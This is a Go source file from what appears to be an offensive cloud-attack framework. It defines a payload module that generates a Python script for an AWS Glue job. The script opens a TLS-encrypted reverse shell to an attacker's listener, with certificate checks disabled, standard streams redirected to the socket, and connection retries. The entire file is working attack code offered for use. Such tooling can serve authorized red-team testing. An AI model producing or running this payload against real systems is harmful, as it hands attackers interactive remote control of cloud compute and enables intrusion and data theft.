package glue

import (
	"fmt"
	"pathrunner/pkg/modules"
	"pathrunner/pkg/payloads"
	"strings"
)

// RevshellTLSPayload generates a Glue Python Shell script that establishes
// a reverse shell over a TLS-wrapped socket to the attacker listener's shell
// port. Uses Python's ssl module for encryption and subprocess for shell
// execution. Compatible with pathrunner's built-in listener (port 4444).
type RevshellTLSPayload struct{}

func init() {
	payloads.Register(&RevshellTLSPayload{})
}

func (p *RevshellTLSPayload) GetName() string {
	return "revshell/tls"
}

func (p *RevshellTLSPayload) GetDescription() string {
	return "Establish a TLS-encrypted reverse shell to the attacker listener's shell port via Glue job"
}

func (p *RevshellTLSPayload) GetTags() []string {
	return []string{
		payloads.TagServiceGlue,
		payloads.TagLanguagePython,
		payloads.TagTechniqueAccess,
		payloads.TagTransportHTTPS,
	}
}

func (p *RevshellTLSPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "LISTENER_IP",
			Description: "Attacker listener host (IP or hostname)",
			Required:    true,
		},
		{
			Name:        "LISTENER_PORT",
			Description: "Port for reverse shell connection",
			Required:    false,
			Default:     "4444",
		},
		{
			Name:        "SHELL",
			Description: "Shell binary to execute",
			Required:    false,
			Default:     "/bin/sh",
		},
		{
			Name:        "RETRY_COUNT",
			Description: "Number of connection retry attempts",
			Required:    false,
			Default:     "3",
		},
		{
			Name:        "RETRY_DELAY",
			Description: "Seconds between retry attempts",
			Required:    false,
			Default:     "5",
		},
	}
}

func (p *RevshellTLSPayload) Validate(options map[string]string) error {
	if options["LISTENER_IP"] == "" {
		return fmt.Errorf("LISTENER_IP is required for revshell/tls payload")
	}
	if strings.Contains(options["LISTENER_IP"], "'") || strings.Contains(options["LISTENER_PORT"], "'") {
		return fmt.Errorf("LISTENER_IP and LISTENER_PORT must not contain single quotes")
	}
	return nil
}

func (p *RevshellTLSPayload) GenerateCode(options map[string]string) (string, error) {
	listenerIP := options["LISTENER_IP"]
	listenerPort := options["LISTENER_PORT"]
	if listenerPort == "" {
		listenerPort = "4444"
	}
	shell := options["SHELL"]
	if shell == "" {
		shell = "/bin/sh"
	}
	retryCount := options["RETRY_COUNT"]
	if retryCount == "" {
		retryCount = "3"
	}
	retryDelay := options["RETRY_DELAY"]
	if retryDelay == "" {
		retryDelay = "5"
	}

	code := fmt.Sprintf(`import socket
import ssl
import subprocess
import os
import sys
import time

lhost = '%s'
lport = %s
shell = '%s'
retry_count = %s
retry_delay = %s

# Override from job arguments if provided
for i, arg in enumerate(sys.argv):
    if arg == '--LISTENER_IP' and i + 1 < len(sys.argv):
        lhost = sys.argv[i + 1]
    if arg == '--LISTENER_PORT' and i + 1 < len(sys.argv):
        lport = int(sys.argv[i + 1])

print(f"Reverse shell target: {lhost}:{lport} (TLS)")

for attempt in range(1, retry_count + 1):
    try:
        print(f"Connection attempt {attempt}/{retry_count}...")

        # Create a TLS-wrapped socket (skip verification for self-signed certs)
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw_sock.settimeout(30)
        sock = ctx.wrap_socket(raw_sock, server_hostname=lhost)
        sock.connect((lhost, lport))
        sock.settimeout(None)

        print(f"Connected to {lhost}:{lport}")

        # Redirect stdin/stdout/stderr to the socket and exec the shell
        os.dup2(sock.fileno(), 0)
        os.dup2(sock.fileno(), 1)
        os.dup2(sock.fileno(), 2)

        subprocess.call([shell, '-i'])
        break

    except ConnectionRefusedError:
        print(f"Connection refused (attempt {attempt}/{retry_count})")
    except socket.timeout:
        print(f"Connection timed out (attempt {attempt}/{retry_count})")
    except Exception as e:
        print(f"Connection error: {e} (attempt {attempt}/{retry_count})")

    if attempt < retry_count:
        print(f"Retrying in {retry_delay}s...")
        time.sleep(retry_delay)

print("Reverse shell session ended")
`, listenerIP, listenerPort, shell, retryCount, retryDelay)

	return code, nil
}

func (p *RevshellTLSPayload) ProcessResult(result string) (string, error) {
	return result, nil
}
